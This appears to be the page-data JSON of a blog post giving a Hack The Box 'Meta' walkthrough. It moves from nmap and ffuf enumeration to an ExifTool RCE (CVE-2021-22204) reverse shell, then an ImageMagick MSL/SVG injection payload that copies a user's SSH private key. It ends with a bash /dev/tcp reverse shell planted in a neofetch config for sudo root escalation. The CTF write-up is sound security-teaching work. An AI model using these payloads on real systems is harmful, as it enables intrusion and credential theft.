{
    "componentChunkName": "component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx",
    "path": "/meta",
    "result": {"data":{"post":{"slug":"/meta","title":"Meta","date":"14.03.2021","tags":[{"name":"Writeup","slug":"writeup"}],"description":null,"canonicalUrl":null,"body":"var _excluded = [\"components\"];\n\nfunction _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsxRuntime classic */\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Meta\",\n  \"date\": \"2021-03-14T00:00:00.000Z\",\n  \"tags\": [\"Writeup\"]\n};\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, _excluded);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"708px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"73.75%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC0UlEQVQ4y3WTzW8bVRTFzY6QOPNlz9jz/fXeG9dje9zYjlNS2IBUgbqpxI5CWxWpogsCBSUrUBVVrNh0QQEFiR2wQGKN+CP4j35oZuImgmZxNOeO7j3v3DdnOqYtMa6A5Ui2ewVdQ+L7Ct27RjedoYk5dl4RJiX9bIaWVWjpnEFc0qkH9b76H+qDtq0CFUR8fEdw93aOnRbYao1S+0TBnMibkgZThFjhFWu68exC8LKzWmzLLLguYj5/eosHvxxz/+yIoyc3mJZz/GiJH+8R5kvcYEYaVgRySTcq/yt4/nQUu4bi/gcZ7//2nJ/P/ubH57/z3osveHRnRNdd4YslxfgQP1viBRW+WKAlk1cL6rbCtCSP70nWf3zPp3/+w9Gvf3FwdsKTD6+x5a4IxYpi9CZutsCJKzyxQL9K0HQkr+sF7ywjTl98xN2fTrn3wzc8fXaLw/0ZWrzGThdk+Q0GyYJeWuGp1asdbnjtUutJ3t0L+farCSePJxysFAO5JiwO6CZ7GPECM94jkCsCtWInusJhK1w7LTDciqEjCN2E13oj/LwiySuibEaQTgnSCXE2Y5hW6P64FbwstMFuTzAIJpw++47Pvvyak+NjHn3yEC0osaKSnWxOLy7ZTiuscIwRjokTRcfoS/Re66jN4KVc9iRFecho/Baj8ibr9U2SSOFHI5ysZJiMsdMSLyjIEkUUSzqGI7FcdY4Lbtbck7yxm+K+HWJfj9jaSRhEkkwoVCFRhUIpSZJLbL/dslnZHCrMobwE9RKGXTCcSmxR8xHGsMAYtP3WpmfQok5HI1h/Tdub4HgTtJ5o1g3SJXG+Tyz20a0C3VLN5cdZheWMmpn6roN0ge2WTW22Dtt4DIMpXlQ1vBZ0/AmxWOIn82ZQ6yuiKCNPUy7+f4ntjps0bJLSMZwcwxHodt6g5pta62fo/ez8XY5mC7S+eFlv+owGAnOY8y/D4rD35D7wZQAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"Meta\",\n    \"title\": \"Meta\",\n    \"src\": \"/Blogs_Writeups/static/6569b74f51e3c66dee37ef1b361b9212/6106f/meta.png\",\n    \"srcSet\": [\"/Blogs_Writeups/static/6569b74f51e3c66dee37ef1b361b9212/5243c/meta.png 240w\", \"/Blogs_Writeups/static/6569b74f51e3c66dee37ef1b361b9212/ab158/meta.png 480w\", \"/Blogs_Writeups/static/6569b74f51e3c66dee37ef1b361b9212/6106f/meta.png 708w\"],\n    \"sizes\": \"(max-width: 708px) 100vw, 708px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"h2\", null, \"Introduction\"), mdx(\"h3\", null, \"Scanning and Enumeration of Open Ports (Using Nmap)\"), mdx(\"h5\", null, \"Nmap Service Scanning\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"\\u279C  HTB git:(master) \\u2717 nmap -Pn -sV -sC 10.10.11.140\\n\\nStarting Nmap 7.60 ( https://nmap.org ) at 2022-03-15 12:33 IST\\nNmap scan report for 10.10.11.140\\nHost is up (0.26s latency).\\nNot shown: 998 closed ports\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\\n| ssh-hostkey: \\n|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)\\n|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)\\n|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (EdDSA)\\n80/tcp open  http    Apache httpd\\n|_http-server-header: Apache\\n|_http-title: Did not follow redirect to http://artcorp.htb\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 37.71 seconds\\n\")), mdx(\"p\", null, \"We can see a Http server running on Port 80 and ssh service running on port22.\"), mdx(\"h3\", null, \"Checking on port 80:\"), mdx(\"p\", null, \"We got the site url : \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"artcorp.htb\")), mdx(\"p\", null, \"Open \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/etc/hosts\"), \" file and add \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"10.10.11.140    artcorp.htb\")), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"sudo nano /etc/hosts\\n\")), mdx(\"p\", null, \"Nothing seems interesting on the website.Lets do a subdomain fuzz using \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"ffuf\"), \".I used the following \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://github.com/danielmiessler/SecLists\"\n  }, \"wordlist.\")), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://artcorp.htb/ -H \\\"Host:http://FUZZ.artcorp.htb\\\" -mc all -fc 404,400\\n\\n\")), mdx(\"p\", null, \"Yep, found a subdomain \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"dev01\"), \".\"), mdx(\"p\", null, \"Open \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/etc/hosts\"), \" file and add \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"10.10.11.140    dev01.artcorp.htb\")), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"sudo nano /etc/hosts\\n\")), mdx(\"p\", null, \"We got a web interface of \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"MetaView.\"), \" Uploading a random file gave\\n\", mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"773px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"60%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABHklEQVQoz9WRS07DMBRFvT6WwBLYANtDfFQhJAYMoEpJ6jhOnPifzsjvIrukoKpS+IwYHOn5Pfm+62uirIe27R7XQhoPqR2k+Q0epKwVWFlHcl6jVjYOGu0icx3634EkKcXVzQp3qwdc394jSXNUjQYXEqVQ4JWEkOak6LxUGQtlw9mChIvJ6xYpLSJhwUuSYb3JYv95vYni6ovrmVmYlQ60cBDSgRi3g/M7GOfRdT3GCZgmYJwmDMOIYZzQ9QPeuj7OA7HuezBeI6UMF5cdzs5HPD61+wwpq7BlJbKcIy8qZJSDcXHIL37UCYK7EEdKPZLMo2ocSGiEzAJBPCJUPC99wPx0bS20+8jwOJef8CnuDpAlB8dulviTw/8p+A4e6IGVWsJW9AAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"metaview\",\n    \"title\": \"metaview\",\n    \"src\": \"/Blogs_Writeups/static/1668b91f81867f9d3ecae17a2f7fee96/dc084/metaview.png\",\n    \"srcSet\": [\"/Blogs_Writeups/static/1668b91f81867f9d3ecae17a2f7fee96/5243c/metaview.png 240w\", \"/Blogs_Writeups/static/1668b91f81867f9d3ecae17a2f7fee96/ab158/metaview.png 480w\", \"/Blogs_Writeups/static/1668b91f81867f9d3ecae17a2f7fee96/dc084/metaview.png 773w\"],\n    \"sizes\": \"(max-width: 773px) 100vw, 773px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \"), \"\\nUploading a jpg/png file gave:\"), mdx(\"p\", null, mdx(\"span\", {\n    parentName: \"p\",\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"776px\"\n    }\n  }, \"\\n      \", mdx(\"span\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"59.583333333333336%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABmUlEQVQoz51TW27bMBDkFXODniIH6MnaBmhSII2N2nFk622KoihKpOT+1LaUKZaSAzmxgaIfg10S5HB3dsgq06K2O1R2N0TTQpvmP9GC5apCJksHnivI0qCsG6jKnqHQ5p/ANmGCL9++4/7HI77ePWDtx5Bl7R4QUrtI60ukw55FWRtoM6wZXfA2EYJoCz9MsQkSvKxDeH7ksPJ8bIW6UvUQM2mRCgtZWjDSrd39hrEN/uwP6PtXdF2Pru/Rv8Llh2OH/eGIwwjKj8cOXChE6Ra3n/e4+dTj/nEHJgqNMOZIeA7SU+lRQ22Q8twNidYEPeKUkxS50lj5DWZLC54bsHib4Wn+7NqMUuE0ozbo8K+lhyDmyFV9cQCn1k3bQBYCQhZEKPBztsDieX2mU1HWbwM67U9JpkNSVeM65KIAo2S+eHEDmF4iIqo6iIdhkZ2ukdKDKRfgQoIlVOF8iTDJ3tnB4Gm2cHKQtabWeU9IUcjS6cmozJUXONukWXF2kCxEFWZSXyQbYEb7jD78qMfkYm0/6HetwtNP+Qtu9HvnccTDwwAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  }), \"\\n  \", mdx(\"img\", {\n    parentName: \"span\",\n    \"className\": \"gatsby-resp-image-image\",\n    \"alt\": \"jpg\",\n    \"title\": \"jpg\",\n    \"src\": \"/Blogs_Writeups/static/5bcba9fad592ddb3b7b122181f0a1d2a/97f2a/content.png\",\n    \"srcSet\": [\"/Blogs_Writeups/static/5bcba9fad592ddb3b7b122181f0a1d2a/5243c/content.png 240w\", \"/Blogs_Writeups/static/5bcba9fad592ddb3b7b122181f0a1d2a/ab158/content.png 480w\", \"/Blogs_Writeups/static/5bcba9fad592ddb3b7b122181f0a1d2a/97f2a/content.png 776w\"],\n    \"sizes\": \"(max-width: 776px) 100vw, 776px\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    },\n    \"loading\": \"lazy\",\n    \"decoding\": \"async\"\n  }), \"\\n    \")), mdx(\"p\", null, \"Hmmm...this output looks familiar.\", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Exiftool\"), \" is used for reading, writing and editing meta information in a wide variety of files.\\nLets check the output of Exiftool on our local machine.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"\\u279C  Meta git:(master) \\u2717 exiftool image.jpg   \\nExifTool Version Number         : 10.80\\nFile Name                       : image.jpg\\nDirectory                       : .\\nFile Size                       : 46 kB\\nFile Modification Date/Time     : 2022:03:16 12:22:06+05:30\\nFile Access Date/Time           : 2022:03:16 12:22:51+05:30\\nFile Inode Change Date/Time     : 2022:03:16 12:22:06+05:30\\nFile Permissions                : rw-rw-r--\\nFile Type                       : JPEG\\nFile Type Extension             : jpg\\nMIME Type                       : image/jpeg\\nJFIF Version                    : 1.01\\nExif Byte Order                 : Big-endian (Motorola, MM)\\nX Resolution                    : 72\\nY Resolution                    : 72\\nResolution Unit                 : inches\\nY Cb Cr Positioning             : Centered\\nImage Width                     : 750\\nImage Height                    : 467\\nEncoding Process                : Progressive DCT, Huffman coding\\nBits Per Sample                 : 8\\nColor Components                : 3\\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\\nImage Size                      : 750x467\\nMegapixels                      : 0.350\\n\\n\")), mdx(\"p\", null, \"Yep we are on the right track. The web interface is using Exiftool to give info of jpg/png files.\"), mdx(\"h2\", null, \"Exiftool | Reverse Shell\"), mdx(\"p\", null, \"Lets search for any vulnerabilities of Exiftool.Found some info here. \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/\"\n  }, \"Vulnerability\"), \".\\nThis enabled a malicious actor to perform a Remote code Execution attack.Let's exploit it.\"), mdx(\"p\", null, \"Found the exploit \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://github.com/convisolabs/CVE-2021-22204-exiftool\"\n  }, \"here\"), \". Download the exploit.py,configfile and image.jpg.\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Change the port and ip in exploit.py\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Run command \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"python3 exploit.py\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"Open up a listener on the above port \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"nv -nvlp <port-no>\"))), mdx(\"p\", null, \"This will generate a malicious image file. Upload it in the metaview web-interface.Yeah,we got the Reverse Shell.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"$ whoami\\nwww-data\\n\\n$ pwd\\n/var/www/dev01.artcorp.htb/metaview\\n\\n\\n$ cd /home\\n$ ls\\nthomas\\n\\n\")), mdx(\"p\", null, \"We have one user thomas.\"), mdx(\"h2\", null, \"User Privilege\"), mdx(\"p\", null, \"Running \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS\"\n  }, \"LinPeAs\"), \" to get system information.\"), mdx(\"p\", null, \"Found this interesting info:\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"\\u2554\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u2563 .sh files in path\\n\\u255A https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path\\n/usr/local/bin/convert_images.sh\\n/usr/bin/gettext.sh\\n\")), mdx(\"p\", null, \"Migrating and seeing the content of the files:\"), mdx(\"p\", null, \"convert_images.sh\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"#!/bin/bash\\ncd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null\\npkill mogrify\\n\")), mdx(\"p\", null, \"It uses mogrify. Lets do some research and find its vulnerabilities(if any). It is similar to ImageMagick tool and used for\\nthe same purpose.Found one interesting thing \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://www.exploit-db.com/exploits/39767\"\n  }, \"here\"), \". It has CVE-2016-3714 - Insufficient shell characters\\nfiltering leads to (potentially remote) code execution.\"), mdx(\"p\", null, \"Lets exploit it.\"), mdx(\"p\", null, \"If we look properly \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"convert_images.sh\"), \" file migrates to /var/www/dev01.artcorp.htb/convert_images/ and execute mogrify\\non all the files present in the directory. So lets create a .svg file as described \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://www.exploit-db.com/exploits/39767\"\n  }, \"here\"), \".\"), mdx(\"p\", null, \"We also see that there is .ssh folder in /home/thomas which we can't access.Lets try to access that folder using our .svg file.\"), mdx(\"ol\", null, mdx(\"li\", {\n    parentName: \"ol\"\n  }, \"Save this file in /var/www/dev01.artcorp.htb/convert_images/ with .svg extension.\")), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"<image authenticate='ff\\\" `echo $(cat ~/.ssh/id_rsa) > /dev/shm/id_rsa`;\\\"'>\\n  <read filename=\\\"pdf:/etc/passwd\\\"/>\\n  <get width=\\\"base-width\\\" height=\\\"base-height\\\" />\\n  <resize geometry=\\\"400x400\\\" />\\n  <write filename=\\\"test.png\\\" />\\n  <svg width=\\\"700\\\" height=\\\"700\\\" xmlns=\\\"http://www.w3.org/2000/svg\\\" xmlns:xlink=\\\"http://www.w3.org/1999/xlink\\\">       \\n  <image xlink:href=\\\"msl:poc.svg\\\" height=\\\"100\\\" width=\\\"100\\\"/>\\n  </svg>\\n</image>\\n\")), mdx(\"ol\", {\n    \"start\": 2\n  }, mdx(\"li\", {\n    parentName: \"ol\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Migrate to /usr/local/bin and execute convert_images.sh\")), mdx(\"li\", {\n    parentName: \"ol\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Go to /dev/shm and you will find \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"id_rsa\"), \" file with user as thomas.\"))), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"$ ls -al\\ntotal 4\\ndrwxrwxrwt  2 root   root     60 Mar 24 04:14 .\\ndrwxr-xr-x 16 root   root   3080 Mar 24 02:02 ..\\n-rw-r--r--  1 thomas thomas 2590 Mar 24 04:14 id_rsa\\n\")), mdx(\"p\", null, \"Store the content of id_rsa in local file and used it to ssh as thomas and read the flag.\"), mdx(\"h2\", null, \"System Own\"), mdx(\"p\", null, \"Let's check if we have any commands to run as sudo user.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"sudo -l \\n\")), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"Matching Defaults entries for thomas on meta:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin, env_keep+=XDG_CONFIG_HOME\\n\\nUser thomas may run the following commands on meta:\\n    (root) NOPASSWD: /usr/bin/neofetch \\\\\\\"\\\\\\\"\\n\\n\")), mdx(\"p\", null, \"This shows that user thomas can run \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"neofetch command\"), \" as sudo without any password.\"), mdx(\"p\", null, \"Searched if neofetch can be used to get reverse shell and found some relevant info \", mdx(\"a\", {\n    parentName: \"p\",\n    \"href\": \"https://gtfobins.github.io/gtfobins/neofetch/#sudo\"\n  }, \"here\")), mdx(\"p\", null, \"There was a .config folder in thomas home directory. Found neofetch config file there.\\nNow I added a reverse shell command at the starting of the file.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"/bin/bash -c \\\"bash &>/dev/tcp/10.10.16.11/4444 <&1\\\"\\n\")), mdx(\"p\", null, \"I want that if I run neofetch that it uses this config file I have changed. So for that I changed the base path\\nto load config file by the following command.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"export XDG_CONFIG_HOME=/home/thomas/.config\\n\")), mdx(\"h1\", null), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"which neofetch \\n/usr/bin/neofetch\\n\")), mdx(\"p\", null, \"So I opened a listener at my local system and ran the following command from meta.\"), mdx(\"pre\", null, mdx(\"code\", {\n    parentName: \"pre\"\n  }, \"sudo -u root /usr/bin/neofetch\\n\")), mdx(\"p\", null, \"and Yipee got the root shell.\"));\n}\n;\nMDXContent.isMDXComponent = true;","excerpt":"Introduction Scanning and Enumeration of Open Ports (Using Nmap) Nmap Service Scanning We can see a Http server running on Port 80 and ssh…","timeToRead":2,"banner":null}},"pageContext":{"slug":"/meta","formatString":"DD.MM.YYYY"}},
    "staticQueryHashes": ["2744905544","3090400250","318001574"]}